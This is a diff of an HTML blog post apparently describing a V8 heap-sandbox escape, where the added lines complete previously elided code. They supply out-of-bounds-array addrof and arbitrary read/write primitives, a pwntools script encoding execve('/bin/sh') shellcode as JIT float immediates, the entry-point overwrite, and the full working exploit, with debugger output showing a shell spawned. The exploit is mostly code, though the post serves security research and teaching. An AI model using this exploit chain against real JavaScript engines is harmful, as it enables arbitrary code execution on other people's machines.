@@ -250,28 +250,32 @@ index 7c7b917502..550b25d4ba 100644
 <span style=color:#66d9ef>let</span> <span style=color:#a6e22e>oob</span> <span style=color:#f92672>=</span> [<span style=color:#ae81ff>1.1</span>];
 <span style=color:#a6e22e>oob</span>.<span style=color:#a6e22e>len</span>(<span style=color:#ae81ff>1337</span>);
 
-<span style=color:#75715e>/* flt.elements @ oob[] */</span>
-<span style=color:#66d9ef>let</span> <span style=color:#a6e22e>flt</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>x</span>[<span style=color:#ae81ff>1.1</span>];
+<span style=color:#75715e>/* flt.elements @ oob[6] */</span>
+<span style=color:#66d9ef>let</span> <span style=color:#a6e22e>flt</span> <span style=color:#f92672>=</span> [<span style=color:#ae81ff>1.1</span>];
 
-<span style=color:#75715e>/* obj.elements @ oob[] */</span>
+<span style=color:#75715e>/* obj.elements @ oob[15] */</span>
 <span style=color:#66d9ef>let</span> <span style=color:#a6e22e>tmp</span> <span style=color:#f92672>=</span> {<span style=color:#a6e22e>a</span><span style=color:#f92672>:</span> <span style=color:#ae81ff>1</span>};
-<span style=color:#66d9ef>let</span> <span style=color:#a6e22e>obj</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>x</span>[<span style=color:#a6e22e>tmp</span>];
+<span style=color:#66d9ef>let</span> <span style=color:#a6e22e>obj</span> <span style=color:#f92672>=</span> [<span style=color:#a6e22e>tmp</span>];
 
 <span style=color:#75715e>/* addrof primitive */</span>
 <span style=color:#66d9ef>function</span> <span style=color:#a6e22e>addrof</span>(<span style=color:#a6e22e>o</span>) {
-  <span style=color:#75715e>// ...
-</span><span style=color:#75715e></span>}
+  <span style=color:#a6e22e>oob</span>[<span style=color:#ae81ff>6</span>] <span style=color:#f92672>=</span> <span style=color:#a6e22e>oob</span>[<span style=color:#ae81ff>15</span>]; 
+  <span style=color:#a6e22e>obj</span>[<span style=color:#ae81ff>0</span>] <span style=color:#f92672>=</span> <span style=color:#a6e22e>o</span>;
+  <span style=color:#66d9ef>return</span> (<span style=color:#a6e22e>ftoi</span>(<span style=color:#a6e22e>flt</span>[<span style=color:#ae81ff>0</span>]) <span style=color:#f92672>&amp;</span> <span style=color:#ae81ff>0xffffffff</span><span style=color:#a6e22e>n</span>) <span style=color:#f92672>-</span> <span style=color:#ae81ff>1</span><span style=color:#a6e22e>n</span>;
+}
 
 <span style=color:#75715e>/* 64-bit read primitive */</span>
 <span style=color:#66d9ef>function</span> <span style=color:#a6e22e>read</span>(<span style=color:#a6e22e>p</span>) {
-  <span style=color:#75715e>// ...
-</span><span style=color:#75715e></span>  <span style=color:#66d9ef>return</span> <span style=color:#a6e22e>ftoi</span>(<span style=color:#a6e22e>flt</span>[<span style=color:#ae81ff>0</span>]);
+  <span style=color:#66d9ef>let</span> <span style=color:#a6e22e>a</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>ftoi</span>(<span style=color:#a6e22e>oob</span>[<span style=color:#ae81ff>6</span>]) <span style=color:#f92672>&gt;&gt;</span> <span style=color:#ae81ff>32</span><span style=color:#a6e22e>n</span>;
+  <span style=color:#a6e22e>oob</span>[<span style=color:#ae81ff>6</span>] <span style=color:#f92672>=</span> <span style=color:#a6e22e>itof</span>((<span style=color:#a6e22e>a</span> <span style=color:#f92672>&lt;&lt;</span> <span style=color:#ae81ff>32</span><span style=color:#a6e22e>n</span>) <span style=color:#f92672>+</span> <span style=color:#a6e22e>p</span> <span style=color:#f92672>-</span> <span style=color:#ae81ff>8</span><span style=color:#a6e22e>n</span> <span style=color:#f92672>+</span> <span style=color:#ae81ff>1</span><span style=color:#a6e22e>n</span>);
+  <span style=color:#66d9ef>return</span> <span style=color:#a6e22e>ftoi</span>(<span style=color:#a6e22e>flt</span>[<span style=color:#ae81ff>0</span>]);
 }
 
 <span style=color:#75715e>/* 64-bit write primitive */</span>
 <span style=color:#66d9ef>function</span> <span style=color:#a6e22e>write</span>(<span style=color:#a6e22e>p</span>, <span style=color:#a6e22e>x</span>) {
-  <span style=color:#75715e>// ...
-</span><span style=color:#75715e></span>  <span style=color:#a6e22e>flt</span>[<span style=color:#ae81ff>0</span>] <span style=color:#f92672>=</span> <span style=color:#a6e22e>itof</span>(<span style=color:#a6e22e>x</span>);
+  <span style=color:#66d9ef>let</span> <span style=color:#a6e22e>a</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>ftoi</span>(<span style=color:#a6e22e>oob</span>[<span style=color:#ae81ff>6</span>]) <span style=color:#f92672>&gt;&gt;</span> <span style=color:#ae81ff>32</span><span style=color:#a6e22e>n</span>;
+  <span style=color:#a6e22e>oob</span>[<span style=color:#ae81ff>6</span>] <span style=color:#f92672>=</span> <span style=color:#a6e22e>itof</span>((<span style=color:#a6e22e>a</span> <span style=color:#f92672>&lt;&lt;</span> <span style=color:#ae81ff>32</span><span style=color:#a6e22e>n</span>) <span style=color:#f92672>+</span> <span style=color:#a6e22e>p</span> <span style=color:#f92672>-</span> <span style=color:#ae81ff>8</span><span style=color:#a6e22e>n</span> <span style=color:#f92672>+</span> <span style=color:#ae81ff>1</span><span style=color:#a6e22e>n</span>);
+  <span style=color:#a6e22e>flt</span>[<span style=color:#ae81ff>0</span>] <span style=color:#f92672>=</span> <span style=color:#a6e22e>itof</span>(<span style=color:#a6e22e>x</span>);
 }
 </code></pre></div><h3 id=33-redirecting-code-execution>3.3. Redirecting Code Execution<a href=#33-redirecting-code-execution class=hanchor arialabel=Anchor>&#8983;</a> </h3>
 <p>Now we can finally move on to the interesting part! How, given that we are in this heap sandbox, can we redirect code execution? Not necessarily to a place we control, but just to any arbitrary location.</p>
@@ -391,29 +395,37 @@ pwndbg&gt; x/40i 0x55cdc0004040
 <div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-py data-lang=py><span style=color:#75715e>#!/usr/bin/env python3</span>
 
 <span style=color:#f92672>from</span> pwn <span style=color:#f92672>import</span> <span style=color:#f92672>*</span>
+
 context<span style=color:#f92672>.</span>arch <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;amd64&#39;</span>
 
+
 <span style=color:#66d9ef>def</span> <span style=color:#a6e22e>convert</span>(x):
+    print(len(x))
     jmp <span style=color:#f92672>=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;</span><span style=color:#ae81ff>\xeb\x0c</span><span style=color:#e6db74>&#39;</span> <span style=color:#75715e># jmp 0xe</span>
     <span style=color:#66d9ef>return</span> u64(x<span style=color:#f92672>.</span>ljust(<span style=color:#ae81ff>6</span>, <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;</span><span style=color:#ae81ff>\x90</span><span style=color:#e6db74>&#39;</span>) <span style=color:#f92672>+</span> jmp)
 
+
 imm <span style=color:#f92672>=</span> [
     asm(<span style=color:#e6db74>&#39;push SYS_execve; pop rax&#39;</span>),
-    asm(<span style=color:#e6db74>&#39;push 0x0068732f&#39;</span>), <span style=color:#75715e># push &#34;/sh\0&#34;</span>
-    asm(<span style=color:#e6db74>&#39;push 0x6e69622f&#39;</span>), <span style=color:#75715e># push &#34;/bin&#34;</span>
+    asm(<span style=color:#e6db74>&#39;push 0x0068732f; pop rbx&#39;</span>), <span style=color:#75715e># &#34;/sh\0&#34;</span>
+    asm(<span style=color:#e6db74>&#39;push 0x6e69622f; pop rcx&#39;</span>), <span style=color:#75715e># &#34;/bin&#34;</span>
+    asm(<span style=color:#e6db74>&#39;shl rbx, 0x20&#39;</span>),
+    asm(<span style=color:#e6db74>&#39;add rbx, rcx; push rbx&#39;</span>),
     asm(<span style=color:#e6db74>&#39;mov rdi, rsp&#39;</span>),
     asm(<span style=color:#e6db74>&#39;xor rsi, rsi; xor rdx, rdx&#39;</span>),
     asm(<span style=color:#e6db74>&#39;syscall&#39;</span>)
 ]
 
 imm <span style=color:#f92672>=</span> [convert(x) <span style=color:#66d9ef>for</span> x <span style=color:#f92672>in</span> imm]
-print(imm)
+log<span style=color:#f92672>.</span>info(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#39;</span><span style=color:#e6db74>{</span>imm<span style=color:#e6db74>}</span><span style=color:#e6db74>&#39;</span>)
 
 <span style=color:#e6db74>&#34;&#34;&#34;
 </span><span style=color:#e6db74>[
 </span><span style=color:#e6db74>    930996698553531242,
-</span><span style=color:#e6db74>    930996079408918376,
-</span><span style=color:#e6db74>    930996551870984040,
+</span><span style=color:#e6db74>    930937805292646248,
+</span><span style=color:#e6db74>    930936078731456360,
+</span><span style=color:#e6db74>    930996696683626824,
+</span><span style=color:#e6db74>    930996697537642824,
 </span><span style=color:#e6db74>    930996698562922824,
 </span><span style=color:#e6db74>    931068857101463880,
 </span><span style=color:#e6db74>    930996698557187343
@@ -432,8 +444,10 @@ print(imm)
 
 <span style=color:#66d9ef>let</span> <span style=color:#a6e22e>x</span> <span style=color:#f92672>=</span> [
   <span style=color:#ae81ff>930996698553531242</span><span style=color:#a6e22e>n</span>,
-  <span style=color:#ae81ff>930996079408918376</span><span style=color:#a6e22e>n</span>,
-  <span style=color:#ae81ff>930996551870984040</span><span style=color:#a6e22e>n</span>,
+  <span style=color:#ae81ff>930937805292646248</span><span style=color:#a6e22e>n</span>,
+  <span style=color:#ae81ff>930936078731456360</span><span style=color:#a6e22e>n</span>,
+  <span style=color:#ae81ff>930996696683626824</span><span style=color:#a6e22e>n</span>,
+  <span style=color:#ae81ff>930996697537642824</span><span style=color:#a6e22e>n</span>,
   <span style=color:#ae81ff>930996698562922824</span><span style=color:#a6e22e>n</span>,
   <span style=color:#ae81ff>931068857101463880</span><span style=color:#a6e22e>n</span>,
   <span style=color:#ae81ff>930996698557187343</span><span style=color:#a6e22e>n</span>
@@ -445,8 +459,10 @@ print(imm)
 <span style=color:#75715e>/*
 </span><span style=color:#75715e>[
 </span><span style=color:#75715e>  1.9711828979523134e-246,
-</span><span style=color:#75715e>  1.9710255989867843e-246,
-</span><span style=color:#75715e>  1.9711456320011017e-246,
+</span><span style=color:#75715e>  1.9562205631094693e-246,
+</span><span style=color:#75715e>  1.9557819155246427e-246,
+</span><span style=color:#75715e>  1.9711824228871598e-246,
+</span><span style=color:#75715e>  1.971182639857203e-246,
 </span><span style=color:#75715e>  1.9711829003383248e-246,
 </span><span style=color:#75715e>  1.9895153920223886e-246,
 </span><span style=color:#75715e>  1.971182898881177e-246
@@ -459,8 +475,10 @@ print(imm)
 <span style=color:#66d9ef>const</span> <span style=color:#a6e22e>foo</span> <span style=color:#f92672>=</span> () =&gt; {
   <span style=color:#66d9ef>return</span> [
     <span style=color:#ae81ff>1.9711828979523134</span><span style=color:#a6e22e>e</span><span style=color:#f92672>-</span><span style=color:#ae81ff>246</span>,
-    <span style=color:#ae81ff>1.9710255989867843</span><span style=color:#a6e22e>e</span><span style=color:#f92672>-</span><span style=color:#ae81ff>246</span>,
-    <span style=color:#ae81ff>1.9711456320011017</span><span style=color:#a6e22e>e</span><span style=color:#f92672>-</span><span style=color:#ae81ff>246</span>,
+    <span style=color:#ae81ff>1.9562205631094693</span><span style=color:#a6e22e>e</span><span style=color:#f92672>-</span><span style=color:#ae81ff>246</span>,
+    <span style=color:#ae81ff>1.9557819155246427</span><span style=color:#a6e22e>e</span><span style=color:#f92672>-</span><span style=color:#ae81ff>246</span>,
+    <span style=color:#ae81ff>1.9711824228871598</span><span style=color:#a6e22e>e</span><span style=color:#f92672>-</span><span style=color:#ae81ff>246</span>,
+    <span style=color:#ae81ff>1.971182639857203</span><span style=color:#a6e22e>e</span><span style=color:#f92672>-</span><span style=color:#ae81ff>246</span>,
     <span style=color:#ae81ff>1.9711829003383248</span><span style=color:#a6e22e>e</span><span style=color:#f92672>-</span><span style=color:#ae81ff>246</span>,
     <span style=color:#ae81ff>1.9895153920223886</span><span style=color:#a6e22e>e</span><span style=color:#f92672>-</span><span style=color:#ae81ff>246</span>,
     <span style=color:#ae81ff>1.971182898881177</span><span style=color:#a6e22e>e</span><span style=color:#f92672>-</span><span style=color:#ae81ff>246</span>
@@ -527,7 +545,9 @@ Continuing.
 process 288620 is executing new program: /usr/bin/dash
 $ id
 </code></pre><h3 id=36-building-an-exploit>3.6. Building an Exploit<a href=#36-building-an-exploit class=hanchor arialabel=Anchor>&#8983;</a> </h3>
-<p>&mldr;</p>
+<p>At this point we have the majority of building blocks necessary to build a working exploit. The only missing component necessary to complete it is the part that overwrites the <code>foo</code> function&rsquo;s entry point.</p>
+<p>This is fairly trivial to implement, we find the address of the <code>foo</code> function using our addrof primtive, before reading the pointer to its code object (stored at an offset of 0x18) via our arbitrary read primitive.</p>
+<p>We then use our arbitrary read primitive again, in order to find the pointer to the <code>foo</code> function&rsquo;s entry point (stored at an offset of 0xc). After this, we use our arbitrary write primitive to overwrite the entry point value to the start of our JITed shellcode.</p>
 <div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-js data-lang=js><span style=color:#75715e>/* get a pointer to the foo.code object */</span>
 <span style=color:#66d9ef>let</span> <span style=color:#a6e22e>code</span> <span style=color:#f92672>=</span> (<span style=color:#a6e22e>read</span>(<span style=color:#a6e22e>addrof</span>(<span style=color:#a6e22e>foo</span>) <span style=color:#f92672>+</span> <span style=color:#ae81ff>0x18</span><span style=color:#a6e22e>n</span>) <span style=color:#f92672>-</span> <span style=color:#ae81ff>1</span><span style=color:#a6e22e>n</span>) <span style=color:#f92672>&amp;</span> <span style=color:#ae81ff>0xffffffff</span><span style=color:#a6e22e>n</span>;
 
@@ -538,7 +558,7 @@ $ id
 <span style=color:#a6e22e>write</span>(<span style=color:#a6e22e>code</span> <span style=color:#f92672>+</span> <span style=color:#ae81ff>0xc</span><span style=color:#a6e22e>n</span>, <span style=color:#a6e22e>entry</span> <span style=color:#f92672>+</span> <span style=color:#ae81ff>0x69</span><span style=color:#a6e22e>n</span>);
 
 <span style=color:#a6e22e>foo</span>();
-</code></pre></div><p>&mldr;
+</code></pre></div><p>In the code below you can find the whole working exploit code. Note that some of the offsets in the primitives have changed - this was due to the <code>foo</code> function being placed above the arrays on the heap.
 <div class=collapsable-code>
 <input id=2 type=checkbox checked>
 <label for=2>
@@ -567,42 +587,48 @@ function itof(x) {
 const foo = () =&gt; {
   return [
     1.9711828979523134e-246,
-    1.9710255989867843e-246,
-    1.9711456320011017e-246,
+    1.9562205631094693e-246,
+    1.9557819155246427e-246,
+    1.9711824228871598e-246,
+    1.971182639857203e-246,
     1.9711829003383248e-246,
     1.9895153920223886e-246,
     1.971182898881177e-246
   ];
 }
 
-for (let i = 0; i &lt; 0x10000; i&#43;&#43;)
+for (let i = 0; i &lt; 0x40000; i&#43;&#43;)
   foo();
 
 /* create an oob array */
 let oob = [1.1];
 oob.len(1337);
 
-/* flt.elements @ oob[] */
-let flt = x[1.1];
+/* flt.elements @ oob[6] */
+let flt = [1.1];
 
-/* obj.elements @ oob[] */
+/* obj.elements @ oob[15] */
 let tmp = {a: 1};
-let obj = x[tmp];
+let obj = [tmp];
 
 /* addrof primitive */
 function addrof(o) {
-  // ...
+  oob[6] = oob[15]; 
+  obj[0] = o;
+  return (ftoi(flt[0]) &amp; 0xffffffffn) - 1n;
 }
 
 /* 64-bit read primitive */
 function read(p) {
-  // ...
+  let a = ftoi(oob[6]) &gt;&gt; 32n;
+  oob[6] = itof((a &lt;&lt; 32n) &#43; p - 8n &#43; 1n);
   return ftoi(flt[0]);
 }
 
 /* 64-bit write primitive */
 function write(p, x) {
-  // ...
+  let a = ftoi(oob[6]) &gt;&gt; 32n;
+  oob[6] = itof((a &lt;&lt; 32n) &#43; p - 8n &#43; 1n);
   flt[0] = itof(x);
 }
 
@@ -619,6 +645,9 @@ foo();
 </code></pre>
 </div>
 </p>
+<p>One last thing to note, while this exploit technique does seem fairly stable, different kernel versions or platforms will affect the offsets of the immediate numbers in the JIT compiled code.</p>
+<p>This poses a slight problem as it significantly affects the reliability. Obviously techniques already exist to combat this issue - e.g. incrementing the offsets until the exploit executes successfully.</p>
+<p>I do have some ideas I&rsquo;d like to explore further around increasing exploit reliability - but those will come in another article.</p>
 <h2 id=references>References<a href=#references class=hanchor arialabel=Anchor>&#8983;</a> </h2>
 <ul>
 <li><a href=https://docs.google.com/document/d/1FM4fQmIhEqPG8uGp5o9A-mnPB5BOeScZYpkHjo0KKA8>V8 Sandbox - High-Level Design Doc</a></li>
